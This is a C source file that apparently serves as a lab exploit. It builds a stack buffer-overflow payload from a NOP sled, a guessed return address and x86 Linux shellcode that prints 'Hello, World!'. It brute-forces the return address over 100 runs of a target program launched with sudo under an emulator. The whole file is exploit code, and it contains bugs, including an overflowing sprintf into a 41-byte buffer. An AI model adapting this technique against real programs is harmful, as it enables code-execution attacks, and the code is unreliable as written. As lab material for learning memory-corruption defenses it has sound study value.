#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 1500

char shellcode[]="\xeb\x1a\x59\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x88"
                 "\x51\x0f\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
		 "\xe8\xe1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f" 
		 "\x72\x6c\x64\x21\x0a\x0d";

int main(int argc, char *argv[])
{
	unsigned int return_address=0xbfffe5fc;

	int buffer_size=DEFAULT_BUFFER_SIZE;
	int h, i;

	if(argc>3)
	{
		printf("Error, program call format is: %s [start_return_address] [buffer_size]\n", argv[0]);
		return 1;
	}
	if(argc==3)
		buffer_size=atoi(argv[2]);
	if(argc>=2)
		return_address=atoi(argv[1]);

	char *buff=(char *) malloc((buffer_size+1)*sizeof(char));

	for(h=0;h<100;h++)
	{
		bzero(buff, (buffer_size+1)*sizeof(char));

		unsigned int *addr_ptr=(unsigned int *) buff;
		for(i=0;i<buffer_size;i+=4)
			*(addr_ptr++)=return_address;
		for(i=0;i<(buffer_size/2)-(strlen(shellcode)/2);i++)
			buff[i]=NOP;

		char *buff_pointer=buff+i;
		for(i=0;i<strlen(shellcode);i++)
			*(buff_pointer++)=shellcode[i];

		char programCommand[buffer_size+2];
		memcpy(programCommand, buff, buffer_size+1);
		programCommand[buffer_size+1]='\0';
		strcat(programCommand, "\'");

		char program[41];
		program[40]='\0';
		sprintf(program, "sudo $SDE_KIT/sde  -- ./simple_example.exe '");

		memcpy(programCommand, program, strlen(program));
		system(programCommand);

		printf("0x%x\n", return_address);
		return_address-=4;
	}

	free(buff);

	return 0;
}
